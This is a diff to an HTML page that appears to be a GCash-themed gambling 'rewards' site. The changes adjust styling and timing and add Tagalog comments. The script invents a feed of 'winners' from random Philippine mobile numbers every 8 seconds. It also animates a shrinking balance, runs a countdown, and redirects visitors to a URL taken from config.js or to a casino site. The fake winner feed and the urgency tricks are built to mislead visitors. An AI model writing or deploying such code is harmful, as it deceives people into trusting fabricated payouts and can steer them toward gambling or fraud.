@@ -43,17 +43,6 @@
             overflow: hidden;
         }
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(212, 175, 55, 0.1) 0%, transparent 70%);
-            z-index: -1;
-        }
-
         .logo-img {
             width: 180px;
             margin-bottom: 20px;
@@ -177,15 +166,7 @@
         }
 
         .payout-amount { color: var(--neon-green); font-weight: 800; }
-
-        .gcash-mini-icon {
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            vertical-align: middle;
-            margin-right: 5px;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
+        .gcash-mini-icon { width: 18px; height: 18px; border-radius: 50%; vertical-align: middle; margin-right: 5px; }
     </style>
 </head>
 <body>
@@ -216,6 +197,7 @@
 <script src="config.js"></script>
 
 <script>
+    // Animation para sa pagbawas ng balance
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
         let startTimestamp = null;
@@ -243,13 +225,14 @@
 
         startTimer(300);
 
+        // Kumukuha ng URL sa config.js
         setTimeout(() => {
             if (typeof LATEST_GCASH_URL !== 'undefined') {
                 window.location.href = LATEST_GCASH_URL; 
             } else {
                 window.location.href = "https://www.casinoplus.com.ph"; 
             }
-        }, 1500);
+        }, 1800);
     }
 
     function startTimer(sec) {
@@ -263,20 +246,15 @@
         }, 1000);
     }
 
+    // Winner Generator
     function generateWinner() {
-        // Mga common Philippine mobile prefixes
         const prefixes = ['0912', '0915', '0917', '0922', '0927', '0935', '0945', '0966', '0998'];
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-        
-        // Random 4-digit sequence para sa dulo (total 11 digits kasama ang prefix at stars)
         const lastFour = Math.floor(1000 + Math.random() * 9000);
-        
         const gcashIcon = "https://xjiligames.github.io/rewards/gc_icon.png";
 
         const winnerEntry = document.createElement('div');
         winnerEntry.className = 'winner-item';
-        
-        // Format: 0912 (4) + *** (3) + 8293 (4) = 11 digits
         winnerEntry.innerHTML = `
             <span>
                 <img src="${gcashIcon}" class="gcash-mini-icon"> 
@@ -292,10 +270,7 @@
         }
     }
 
-    // Interval set to 10 seconds (10000ms)
-    setInterval(generateWinner, 10000);
-
-    // Load initial winners immediately
+    setInterval(generateWinner, 8000); // Mas mabilis na updates (8s)
     generateWinner(); 
     generateWinner();
 </script>
